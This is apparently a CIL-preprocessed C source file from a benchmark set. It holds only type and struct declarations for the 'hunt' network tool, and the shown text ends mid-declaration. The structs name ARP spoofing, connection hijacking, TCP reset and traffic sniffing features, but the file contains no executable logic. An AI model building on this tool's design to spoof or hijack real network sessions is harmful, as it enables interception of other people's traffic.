/* Generated by CIL v. 1.7.3 */
/* print_CIL_Input is false */

#line 133 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef int __pid_t;
#line 138 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned int __id_t;
#line 139 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __time_t;
#line 175 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __syscall_slong_t;
#line 104 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef __id_t id_t;
#line 75 "/usr/include/time.h"
typedef __time_t time_t;
#line 212 "/usr/lib/gcc/x86_64-linux-gnu/4.8/include/stddef.h"
typedef unsigned long size_t;
#line 200 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef unsigned char u_int8_t;
#line 201 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef unsigned short u_int16_t;
#line 202 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef unsigned int u_int32_t;
#line 27 "/usr/include/x86_64-linux-gnu/bits/sigset.h"
struct __anonstruct___sigset_t_2 {
   unsigned long __val[1024UL / (8UL * sizeof(unsigned long ))] ;
};
#line 27 "/usr/include/x86_64-linux-gnu/bits/sigset.h"
typedef struct __anonstruct___sigset_t_2 __sigset_t;
#line 37 "/usr/include/x86_64-linux-gnu/sys/select.h"
typedef __sigset_t sigset_t;
#line 120 "/usr/include/time.h"
struct timespec {
   __time_t tv_sec ;
   __syscall_slong_t tv_nsec ;
};
#line 60 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef unsigned long pthread_t;
#line 63 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
union pthread_attr_t {
   char __size[56] ;
   long __align ;
};
#line 69 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef union pthread_attr_t pthread_attr_t;
#line 75 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
struct __pthread_internal_list {
   struct __pthread_internal_list *__prev ;
   struct __pthread_internal_list *__next ;
};
#line 75 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef struct __pthread_internal_list __pthread_list_t;
#line 90 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
struct __pthread_mutex_s {
   int __lock ;
   unsigned int __count ;
   int __owner ;
   unsigned int __nusers ;
   int __kind ;
   short __spins ;
   short __elision ;
   __pthread_list_t __list ;
};
#line 90 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
union __anonunion_pthread_mutex_t_4 {
   struct __pthread_mutex_s __data ;
   char __size[40] ;
   long __align ;
};
#line 90 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef union __anonunion_pthread_mutex_t_4 pthread_mutex_t;
#line 138 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
struct __anonstruct___data_7 {
   int __lock ;
   unsigned int __futex ;
   unsigned long long __total_seq ;
   unsigned long long __wakeup_seq ;
   unsigned long long __woken_seq ;
   void *__mutex ;
   unsigned int __nwaiters ;
   unsigned int __broadcast_seq ;
};
#line 138 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
union __anonunion_pthread_cond_t_6 {
   struct __anonstruct___data_7 __data ;
   char __size[48] ;
   long long __align ;
};
#line 138 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef union __anonunion_pthread_cond_t_6 pthread_cond_t;
#line 23 "/usr/include/asm-generic/int-ll64.h"
typedef unsigned short __u16;
#line 28 "/usr/include/linux/types.h"
typedef __u16 __be16;
#line 134 "/usr/include/linux/if_ether.h"
struct ethhdr {
   unsigned char h_dest[6] ;
   unsigned char h_source[6] ;
   __be16 h_proto ;
} __attribute__((__packed__)) ;
#line 54 "/usr/include/net/if_arp.h"
struct arphdr {
   unsigned short ar_hrd ;
   unsigned short ar_pro ;
   unsigned char ar_hln ;
   unsigned char ar_pln ;
   unsigned short ar_op ;
};
#line 49 "/usr/include/stdint.h"
typedef unsigned short uint16_t;
#line 51 "/usr/include/stdint.h"
typedef unsigned int uint32_t;
#line 44 "/usr/include/netinet/ip.h"
struct iphdr {
   unsigned int ihl : 4 ;
   unsigned int version : 4 ;
   u_int8_t tos ;
   u_int16_t tot_len ;
   u_int16_t id ;
   u_int16_t frag_off ;
   u_int8_t ttl ;
   u_int8_t protocol ;
   u_int16_t check ;
   u_int32_t saddr ;
   u_int32_t daddr ;
};
#line 26 "/usr/include/netinet/ip_icmp.h"
struct __anonstruct_echo_24 {
   u_int16_t id ;
   u_int16_t sequence ;
};
#line 26 "/usr/include/netinet/ip_icmp.h"
struct __anonstruct_frag_25 {
   u_int16_t __glibc_reserved ;
   u_int16_t mtu ;
};
#line 26 "/usr/include/netinet/ip_icmp.h"
union __anonunion_un_23 {
   struct __anonstruct_echo_24 echo ;
   u_int32_t gateway ;
   struct __anonstruct_frag_25 frag ;
};
#line 26 "/usr/include/netinet/ip_icmp.h"
struct icmphdr {
   u_int8_t type ;
   u_int8_t code ;
   u_int16_t checksum ;
   union __anonunion_un_23 un ;
};
#line 69 "/usr/include/netinet/tcp.h"
typedef u_int32_t tcp_seq;
#line 74 "/usr/include/netinet/tcp.h"
struct __anonstruct____missing_field_name_31 {
   u_int16_t th_sport ;
   u_int16_t th_dport ;
   tcp_seq th_seq ;
   tcp_seq th_ack ;
   u_int8_t th_x2 : 4 ;
   u_int8_t th_off : 4 ;
   u_int8_t th_flags ;
   u_int16_t th_win ;
   u_int16_t th_sum ;
   u_int16_t th_urp ;
};
#line 74 "/usr/include/netinet/tcp.h"
struct __anonstruct____missing_field_name_32 {
   u_int16_t source ;
   u_int16_t dest ;
   u_int32_t seq ;
   u_int32_t ack_seq ;
   u_int16_t res1 : 4 ;
   u_int16_t doff : 4 ;
   u_int16_t fin : 1 ;
   u_int16_t syn : 1 ;
   u_int16_t rst : 1 ;
   u_int16_t psh : 1 ;
   u_int16_t ack : 1 ;
   u_int16_t urg : 1 ;
   u_int16_t res2 : 2 ;
   u_int16_t window ;
   u_int16_t check ;
   u_int16_t urg_ptr ;
};
#line 74 "/usr/include/netinet/tcp.h"
union __anonunion____missing_field_name_30 {
   struct __anonstruct____missing_field_name_31 __annonCompField1 ;
   struct __anonstruct____missing_field_name_32 __annonCompField2 ;
};
#line 74 "/usr/include/netinet/tcp.h"
struct tcphdr {
   union __anonunion____missing_field_name_30 __annonCompField3 ;
};
#line 56 "/usr/include/netinet/udp.h"
struct __anonstruct____missing_field_name_36 {
   u_int16_t uh_sport ;
   u_int16_t uh_dport ;
   u_int16_t uh_ulen ;
   u_int16_t uh_sum ;
};
#line 56 "/usr/include/netinet/udp.h"
struct __anonstruct____missing_field_name_37 {
   u_int16_t source ;
   u_int16_t dest ;
   u_int16_t len ;
   u_int16_t check ;
};
#line 56 "/usr/include/netinet/udp.h"
union __anonunion____missing_field_name_35 {
   struct __anonstruct____missing_field_name_36 __annonCompField4 ;
   struct __anonstruct____missing_field_name_37 __annonCompField5 ;
};
#line 56 "/usr/include/netinet/udp.h"
struct udphdr {
   union __anonunion____missing_field_name_35 __annonCompField6 ;
};
#line 44 "/usr/include/x86_64-linux-gnu/sys/resource.h"
typedef int __priority_which_t;
#line 18 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
struct list_iterator;
#line 20 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
struct list {
   void *l_first ;
   void *l_last ;
   int l_off ;
   int l_produce_done ;
   struct list_iterator *l_iter ;
   int l_locked ;
   pthread_mutex_t l_mutex ;
   pthread_cond_t l_notempty ;
   pthread_t l_locked_thr ;
};
#line 34 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
struct list_iterator {
   struct list *i_list ;
   void *i_cur ;
   struct list_iterator *i_next ;
};
#line 66 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
enum PACKET_TYPE {
    PACKET_NONE = 0,
    PACKET_TCP = 1,
    PACKET_UDP = 2,
    PACKET_ICMP = 3,
    PACKET_ARP = 4
} ;
#line 91 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
union __anonunion_p_hdr_89 {
   struct tcphdr *p_tcph ;
   struct udphdr *p_udph ;
   struct icmphdr *p_icmph ;
};
#line 91 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct packet {
   char p_raw[1514] ;
   int p_raw_len ;
   int p_use_count ;
   enum PACKET_TYPE p_type ;
   pthread_mutex_t p_mutex ;
   struct ethhdr *p_ethh ;
   struct iphdr *p_iph ;
   struct arphdr *p_arph ;
   union __anonunion_p_hdr_89 p_hdr ;
   int p_data_len ;
   char *p_data ;
   time_t p_timestamp ;
   struct packet *p_next_free ;
   struct packet *p_next[8] ;
   void *p_arg[8] ;
   int p_ipc ;
   void *p_ipc_arg ;
};
#line 131
struct ifunc_list;
#line 131 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct ifunc_item {
   void (*func)(struct packet * , void *arg ) ;
   void *arg ;
   struct ifunc_list *next_tcp ;
   struct ifunc_list *next_udp ;
   struct ifunc_list *next_icmp ;
   struct ifunc_list *next_arp ;
   struct ifunc_list *next_ip ;
};
#line 151 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct host_info {
   unsigned long next_seq ;
   unsigned long next_d_seq ;
   unsigned char src_mac[6] ;
   unsigned char dst_mac[6] ;
   unsigned short window ;
   unsigned short id ;
   unsigned int delta_d_seq ;
};
#line 161 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct conn_info {
   unsigned long src_addr ;
   unsigned long dst_addr ;
   unsigned short src_port ;
   unsigned short dst_port ;
   struct host_info src ;
   struct host_info dst ;
   int use_count ;
   unsigned int update_count ;
   unsigned int ack_storm_notify_sec ;
   pthread_mutex_t mutex ;
};
#line 176 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct user_conn_info {
   unsigned long src_addr ;
   unsigned long dst_addr ;
   unsigned short src_port ;
   unsigned short dst_port ;
};
#line 388
enum TTY_COLOR {
    COLOR_BLACK = 0,
    COLOR_RED = 1,
    COLOR_GREEN = 2,
    COLOR_BROWN = 3,
    COLOR_BLUE = 4,
    COLOR_MAGENTA = 5,
    COLOR_CYAN = 6,
    COLOR_LIGHTGRAY = 7,
    COLOR_GRAY = 8,
    COLOR_BRIGHTRED = 9,
    COLOR_BRIGHTGREEN = 10,
    COLOR_YELLOW = 11,
    COLOR_BRIGHTBLUE = 12,
    COLOR_BRIGHTMAGENTA = 13,
    COLOR_BRIGHTCYAN = 14,
    COLOR_WHITE = 15
} ;
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
struct rst_db_item {
   unsigned int src_addr ;
   unsigned int src_mask ;
   unsigned int dst_addr ;
   unsigned int dst_mask ;
   unsigned int src_ports[17] ;
   unsigned int dst_ports[17] ;
   int rst_mode ;
   int rst_only_syn ;
   struct rst_db_item *next ;
};
#line 131 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __off_t;
#line 132 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __off64_t;
#line 23 "/usr/include/x86_64-linux-gnu/bits/termios.h"
typedef unsigned char cc_t;
#line 24 "/usr/include/x86_64-linux-gnu/bits/termios.h"
typedef unsigned int speed_t;
#line 25 "/usr/include/x86_64-linux-gnu/bits/termios.h"
typedef unsigned int tcflag_t;
#line 28 "/usr/include/x86_64-linux-gnu/bits/termios.h"
struct termios {
   tcflag_t c_iflag ;
   tcflag_t c_oflag ;
   tcflag_t c_cflag ;
   tcflag_t c_lflag ;
   cc_t c_line ;
   cc_t c_cc[32] ;
   speed_t c_ispeed ;
   speed_t c_ospeed ;
};
#line 44 "/usr/include/stdio.h"
struct _IO_FILE;
#line 48 "/usr/include/stdio.h"
typedef struct _IO_FILE FILE;
#line 154 "/usr/include/libio.h"
typedef void _IO_lock_t;
#line 160 "/usr/include/libio.h"
struct _IO_marker {
   struct _IO_marker *_next ;
   struct _IO_FILE *_sbuf ;
   int _pos ;
};
#line 245 "/usr/include/libio.h"
struct _IO_FILE {
   int _flags ;
   char *_IO_read_ptr ;
   char *_IO_read_end ;
   char *_IO_read_base ;
   char *_IO_write_base ;
   char *_IO_write_ptr ;
   char *_IO_write_end ;
   char *_IO_buf_base ;
   char *_IO_buf_end ;
   char *_IO_save_base ;
   char *_IO_backup_base ;
   char *_IO_save_end ;
   struct _IO_marker *_markers ;
   struct _IO_FILE *_chain ;
   int _fileno ;
   int _flags2 ;
   __off_t _old_offset ;
   unsigned short _cur_column ;
   signed char _vtable_offset ;
   char _shortbuf[1] ;
   _IO_lock_t *_lock ;
   __off64_t _offset ;
   void *__pad1 ;
   void *__pad2 ;
   void *__pad3 ;
   void *__pad4 ;
   size_t __pad5 ;
   int _mode ;
   char _unused2[(15UL * sizeof(int ) - 4UL * sizeof(void *)) - sizeof(size_t )] ;
};
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
enum __anonenum_ttystate_99 {
    RESET = 0,
    RAW = 1,
    CBREAK = 2
} ;
#line 125 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned int __uid_t;
#line 135 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __clock_t;
#line 183 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef char *__caddr_t;
#line 28 "/usr/include/x86_64-linux-gnu/bits/sockaddr.h"
typedef unsigned short sa_family_t;
#line 149 "/usr/include/x86_64-linux-gnu/bits/socket.h"
struct sockaddr {
   sa_family_t sa_family ;
   char sa_data[14] ;
};
#line 32 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
union sigval {
   int sival_int ;
   void *sival_ptr ;
};
#line 32 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
typedef union sigval sigval_t;
#line 58 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
typedef __clock_t __sigchld_clock_t;
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__kill_54 {
   __pid_t si_pid ;
   __uid_t si_uid ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__timer_55 {
   int si_tid ;
   int si_overrun ;
   sigval_t si_sigval ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__rt_56 {
   __pid_t si_pid ;
   __uid_t si_uid ;
   sigval_t si_sigval ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__sigchld_57 {
   __pid_t si_pid ;
   __uid_t si_uid ;
   int si_status ;
   __sigchld_clock_t si_utime ;
   __sigchld_clock_t si_stime ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__sigfault_58 {
   void *si_addr ;
   short si_addr_lsb ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__sigpoll_59 {
   long si_band ;
   int si_fd ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct__sigsys_60 {
   void *_call_addr ;
   int _syscall ;
   unsigned int _arch ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
union __anonunion__sifields_53 {
   int _pad[128UL / sizeof(int ) - 4UL] ;
   struct __anonstruct__kill_54 _kill ;
   struct __anonstruct__timer_55 _timer ;
   struct __anonstruct__rt_56 _rt ;
   struct __anonstruct__sigchld_57 _sigchld ;
   struct __anonstruct__sigfault_58 _sigfault ;
   struct __anonstruct__sigpoll_59 _sigpoll ;
   struct __anonstruct__sigsys_60 _sigsys ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
struct __anonstruct_siginfo_t_52 {
   int si_signo ;
   int si_errno ;
   int si_code ;
   union __anonunion__sifields_53 _sifields ;
};
#line 62 "/usr/include/x86_64-linux-gnu/bits/siginfo.h"
typedef struct __anonstruct_siginfo_t_52 siginfo_t;
#line 24 "/usr/include/x86_64-linux-gnu/bits/sigaction.h"
union __anonunion___sigaction_handler_72 {
   void (*sa_handler)(int  ) ;
   void (*sa_sigaction)(int  , siginfo_t * , void * ) ;
};
#line 24 "/usr/include/x86_64-linux-gnu/bits/sigaction.h"
struct sigaction {
   union __anonunion___sigaction_handler_72 __sigaction_handler ;
   __sigset_t sa_mask ;
   int sa_flags ;
   void (*sa_restorer)(void) ;
};
#line 194 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct timejob;
#line 196 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct arp_spoof_info {
   unsigned char src_fake_mac[6] ;
   unsigned char src_mac[6] ;
   unsigned char dst_mac[6] ;
   int src_mac_valid ;
   int dst_mac_valid ;
   unsigned int src_addr ;
   unsigned int dst_addr ;
   int can_forward ;
   int in_range ;
   int use_count ;
   int lock_count ;
   int refresh ;
   struct timejob *tj_refresh ;
   struct timejob *tj_reply ;
   struct arp_spoof_info *next ;
   pthread_cond_t lock_cond ;
   pthread_mutex_t mutex ;
};
#line 632
struct time_job;
#line 632 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct timejob {
   int (*j_func)(void *arg , int arg_sec ) ;
   void *j_arg ;
   int j_arg_sec ;
   struct timespec j_ts ;
   struct time_job *j_next ;
};
#line 111 "/usr/include/net/if.h"
struct ifmap {
   unsigned long mem_start ;
   unsigned long mem_end ;
   unsigned short base_addr ;
   unsigned char irq ;
   unsigned char dma ;
   unsigned char port ;
};
#line 126 "/usr/include/net/if.h"
union __anonunion_ifr_ifrn_108 {
   char ifrn_name[16] ;
};
#line 126 "/usr/include/net/if.h"
union __anonunion_ifr_ifru_109 {
   struct sockaddr ifru_addr ;
   struct sockaddr ifru_dstaddr ;
   struct sockaddr ifru_broadaddr ;
   struct sockaddr ifru_netmask ;
   struct sockaddr ifru_hwaddr ;
   short ifru_flags ;
   int ifru_ivalue ;
   int ifru_mtu ;
   struct ifmap ifru_map ;
   char ifru_slave[16] ;
   char ifru_newname[16] ;
   __caddr_t ifru_data ;
};
#line 126 "/usr/include/net/if.h"
struct ifreq {
   union __anonunion_ifr_ifrn_108 ifr_ifrn ;
   union __anonunion_ifr_ifru_109 ifr_ifru ;
};
#line 141 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __suseconds_t;
#line 30 "/usr/include/x86_64-linux-gnu/bits/time.h"
struct timeval {
   __time_t tv_sec ;
   __suseconds_t tv_usec ;
};
#line 55 "/usr/include/x86_64-linux-gnu/sys/time.h"
struct timezone {
   int tz_minuteswest ;
   int tz_dsttime ;
};
#line 61 "/usr/include/x86_64-linux-gnu/sys/time.h"
typedef struct timezone * __restrict  __timezone_ptr_t;
#line 655 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct tcp_spec {
   unsigned long saddr ;
   unsigned long daddr ;
   unsigned short sport ;
   unsigned short dport ;
   char *src_mac ;
   char *dst_mac ;
   unsigned long seq ;
   unsigned long ack_seq ;
   unsigned short window ;
   unsigned short id ;
   int ack ;
   int rst ;
   int psh ;
   char *data ;
   int data_len ;
};
#line 129 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
union __anonunion_pthread_mutexattr_t_5 {
   char __size[4] ;
   int __align ;
};
#line 129 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef union __anonunion_pthread_mutexattr_t_5 pthread_mutexattr_t;
#line 155 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
union __anonunion_pthread_condattr_t_8 {
   char __size[4] ;
   int __align ;
};
#line 155 "/usr/include/x86_64-linux-gnu/bits/pthreadtypes.h"
typedef union __anonunion_pthread_condattr_t_8 pthread_condattr_t;
#line 236 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct arpeth_hdr {
   unsigned char ar_sha[6] ;
   unsigned char ar_sip[4] ;
   unsigned char ar_tha[6] ;
   unsigned char ar_tip[4] ;
};
#line 243 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct mac_info {
   char mac[6] ;
   pthread_mutex_t mutex ;
};
#line 535 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct arp_dont_relay {
   unsigned int src_addr ;
   unsigned int dst_addr ;
   unsigned short src_port ;
   unsigned short dst_port ;
   struct arp_dont_relay *next ;
};
#line 703 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct arp_spec {
   char *src_mac ;
   char *dst_mac ;
   int oper ;
   char *sender_mac ;
   unsigned long sender_addr ;
   char *target_mac ;
   unsigned long target_addr ;
};
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
struct arp_spoof_range {
   struct arp_spoof_info **asi ;
   int asi_count ;
   unsigned int dst_start_addr ;
   unsigned int dst_end_addr ;
   unsigned int src_addr ;
   char src_fake_mac[6] ;
   int refresh ;
   int can_forward ;
   struct arp_spoof_range *next ;
};
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.h"
struct array_item {
   void *ai_data ;
};
#line 20 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.h"
struct array {
   struct array_item *a_arr ;
   int a_size ;
   int a_items ;
   int a_locked ;
   pthread_t a_locked_thr ;
   pthread_mutex_t a_mutex ;
};
#line 47 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.h"
struct array_iterator {
   struct array *i_array ;
   int i_pos ;
};
#line 248 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct add_policy_info {
   unsigned int src_addr ;
   unsigned int src_mask ;
   unsigned int dst_addr ;
   unsigned int dst_mask ;
   unsigned int src_ports[17] ;
   unsigned int dst_ports[17] ;
   struct add_policy_info *next ;
};
#line 172 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __ssize_t;
#line 189 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned int __socklen_t;
#line 109 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef __ssize_t ssize_t;
#line 43 "/usr/include/x86_64-linux-gnu/bits/uio.h"
struct iovec {
   void *iov_base ;
   size_t iov_len ;
};
#line 33 "/usr/include/x86_64-linux-gnu/bits/socket.h"
typedef __socklen_t socklen_t;
#line 224 "/usr/include/x86_64-linux-gnu/bits/socket.h"
struct msghdr {
   void *msg_name ;
   socklen_t msg_namelen ;
   struct iovec *msg_iov ;
   size_t msg_iovlen ;
   void *msg_control ;
   size_t msg_controllen ;
   int msg_flags ;
};
#line 85 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
union u_longchar {
   char buff[4] ;
   unsigned long val ;
};
#line 85 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
typedef union u_longchar t_longchar;
#line 676 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct __anonstruct_idseq_91 {
   unsigned short id ;
   unsigned short seq ;
};
#line 676 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
union __anonunion_un_90 {
   struct __anonstruct_idseq_91 idseq ;
   unsigned int res ;
};
#line 676 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct icmp_spec {
   unsigned int src_addr ;
   unsigned int dst_addr ;
   char *src_mac ;
   char *dst_mac ;
   short type ;
   short code ;
   union __anonunion_un_90 un ;
   void *data ;
   int data_len ;
};
#line 30 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned char __u_char;
#line 31 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned short __u_short;
#line 33 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef __u_char u_char;
#line 34 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef __u_short u_short;
#line 174 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
struct pseudo_header {
   unsigned long saddr ;
   unsigned long daddr ;
   unsigned char null ;
   unsigned char proto ;
   unsigned short tlen ;
};
#line 26 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.h"
struct hash_table_item {
   unsigned int ht_key ;
   void *ht_data ;
};
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.h"
struct hash {
   int h_items ;
   int h_max_items ;
   int h_space_after ;
   struct hash_table_item *h_table ;
   int (*h_eqfunc)(unsigned int key , void *data_ht , void *arg ) ;
   int h_locked ;
   pthread_t h_locked_thr ;
   pthread_mutex_t h_mutex ;
};
#line 44 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.h"
struct hash_iterator {
   struct hash *i_hash ;
   int i_pos ;
};
#line 31 "/usr/include/x86_64-linux-gnu/bits/setjmp.h"
typedef long __jmp_buf[8];
#line 753 "/usr/include/pthread.h"
struct __jmp_buf_tag;
#line 100 "/usr/include/netdb.h"
struct hostent {
   char *h_name ;
   char **h_aliases ;
   int h_addrtype ;
   int h_length ;
   char **h_addr_list ;
};
#line 34 "/usr/include/setjmp.h"
struct __jmp_buf_tag {
   __jmp_buf __jmpbuf ;
   int __mask_was_saved ;
   __sigset_t __saved_mask ;
};
#line 92 "/usr/include/setjmp.h"
typedef struct __jmp_buf_tag sigjmp_buf[1];
#line 183 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct packet_info {
   unsigned long src_addr ;
   unsigned long dst_addr ;
   unsigned short src_port ;
   unsigned short dst_port ;
   struct host_info src ;
   struct packet_info *next ;
};
#line 35 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
struct relay_item {
   pthread_mutex_t mutex ;
   pthread_cond_t lock_cond ;
   int lock_count ;
   unsigned int src_addr ;
   unsigned int src_mask ;
   unsigned int dst_addr ;
   unsigned int dst_mask ;
   unsigned int src_ports[17] ;
   unsigned int dst_ports[17] ;
   unsigned int flags ;
   int ethtap_fd ;
   char *ethtap_name ;
   char ethtap_mac[6] ;
   struct relay_item *next ;
};
#line 46 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
struct watch_tty_data {
   char *src_fake_mac ;
   struct conn_info *ci ;
   int input_mode ;
};
#line 124 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned long __dev_t;
#line 126 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned int __gid_t;
#line 127 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned long __ino_t;
#line 129 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned int __mode_t;
#line 130 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef unsigned long __nlink_t;
#line 153 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __blksize_t;
#line 158 "/usr/include/x86_64-linux-gnu/bits/types.h"
typedef long __blkcnt_t;
#line 46 "/usr/include/x86_64-linux-gnu/bits/stat.h"
struct stat {
   __dev_t st_dev ;
   __ino_t st_ino ;
   __nlink_t st_nlink ;
   __mode_t st_mode ;
   __uid_t st_uid ;
   __gid_t st_gid ;
   int __pad0 ;
   __dev_t st_rdev ;
   __off_t st_size ;
   __blksize_t st_blksize ;
   __blkcnt_t st_blocks ;
   struct timespec st_atim ;
   struct timespec st_mtim ;
   struct timespec st_ctim ;
   __syscall_slong_t __glibc_reserved[3] ;
};
#line 23 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
struct sniff_log {
   unsigned int src_addr ;
   unsigned int dst_addr ;
   unsigned short src_port ;
   unsigned short dst_port ;
   int src_to_dst ;
   int loged_bytes ;
   char *buf ;
   int state ;
   int file_close ;
   FILE *file ;
   struct sniff_log *next ;
};
#line 40 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
struct sniff_info {
   unsigned int src_addr ;
   unsigned int dst_addr ;
   int src_mask ;
   int dst_mask ;
   int src_ports[17] ;
   int dst_ports[17] ;
   int srch_mode ;
   char *search ;
   int log_mode ;
   int log_bytes ;
   int file_close ;
   FILE *file ;
   struct list log ;
   int lock_count ;
   pthread_cond_t lock_cond ;
   pthread_mutex_t mutex ;
};
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
struct mac_disc_info {
   unsigned int start_addr ;
   unsigned int end_addr ;
   struct mac_disc_info *next ;
};
#line 24 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
struct host_up_info {
   unsigned int start_addr ;
   unsigned int end_addr ;
   int *up_ping ;
   int *promisc_ping ;
   int *up_arp ;
   int *promisc_arp ;
   unsigned int up_len ;
};
#line 98 "/usr/include/x86_64-linux-gnu/sys/types.h"
typedef __pid_t pid_t;
#line 54 "/usr/include/x86_64-linux-gnu/sys/select.h"
typedef long __fd_mask;
#line 64 "/usr/include/x86_64-linux-gnu/sys/select.h"
struct __anonstruct_fd_set_3 {
   __fd_mask __fds_bits[1024 / (8 * (int )sizeof(__fd_mask ))] ;
};
#line 64 "/usr/include/x86_64-linux-gnu/sys/select.h"
typedef struct __anonstruct_fd_set_3 fd_set;
#line 30 "/usr/include/netinet/in.h"
typedef uint32_t in_addr_t;
#line 31 "/usr/include/netinet/in.h"
struct in_addr {
   in_addr_t s_addr ;
};
#line 444 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct resolv_item {
   char *name ;
   time_t put_timestamp ;
   time_t get_timestamp ;
   pthread_mutex_t mutex ;
};
#line 257 "/usr/include/netdb.h"
struct servent {
   char *s_name ;
   char **s_aliases ;
   int s_port ;
   char *s_proto ;
};
#line 22 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
struct req {
   unsigned int ip ;
   struct req *next ;
};
#line 27 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
struct res {
